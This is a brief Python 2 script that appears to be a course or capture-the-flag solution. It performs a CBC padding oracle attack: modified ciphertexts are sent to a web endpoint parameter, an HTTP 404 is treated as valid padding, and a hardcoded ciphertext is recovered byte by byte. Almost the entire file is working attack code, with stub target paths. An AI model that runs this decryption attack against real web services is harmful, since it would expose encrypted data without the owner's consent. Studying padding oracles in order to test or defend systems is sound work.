#!/usr/bin/python
import urllib2
import sys
import time
TARGET = '/po?er='
TARGET = '?enc='
#--------------------------------------------------------------
# padding oracle
#--------------------------------------------------------------
class PaddingOracle(object):
    def query(self, q):
        target = TARGET + urllib2.quote(q)    # Create query URL
        req = urllib2.Request(target)         # Send HTTP request to server
        try:
            f = urllib2.urlopen(req)          # Wait for response
        except urllib2.HTTPError, e:          
            if e.code == 404:
                return True # good padding
            return False # bad padding
def strxor(a, b):
    return [chr(ord(aa) ^ ord(bb)) for aa, bb in zip(a, b)]
po = PaddingOracle()
c = '0b7b68f99e5bb9e4767649f71f335a02f25f06c581c7c920b015ca5c6544428b6a49fabe1f480174127267fb72c5f514'   #Initial Key (If available)
c = c.decode('HEX')
g = list('\0' * (len(c)))
for block in range(len(c) / 16, 0, -1):
    for p in range(15, -1, -1):
        for i in range(0, 256):
            pos = (block-2) * 16 + p
            g[pos] = chr(i)
            sg = list(g)
            for q in range((block-1) * 16, len(c)):
                sg[q] = '\0'
            fillchar = chr(16 - p)
            padstr = '\0' * (pos) + fillchar * (16-p) + '\0' * 16
            outstr = strxor(c, strxor(sg, padstr))
            #print 'sg=' + ''.join(sg).encode('HEX')
            #print ' p=' + padstr.encode('HEX')
            #print ' o=' + ''.join(outstr).encode('HEX')
            sys.stdout.write('#(%2d, %2d) = [%3d] = %2x: %s\r' % (block, p, pos, i,''.join(g)))
            sys.stdout.flush()
            if po.query(''.join(outstr).encode('HEX')):
                break
            if i >= 255:
                g[pos] = chr(16 - p)
print "The g is '%s'" % ''.join(g)
print "    (HEX) %s" % ''.join(g).encode('HEX')
# vim: ts=4 sw=4 et
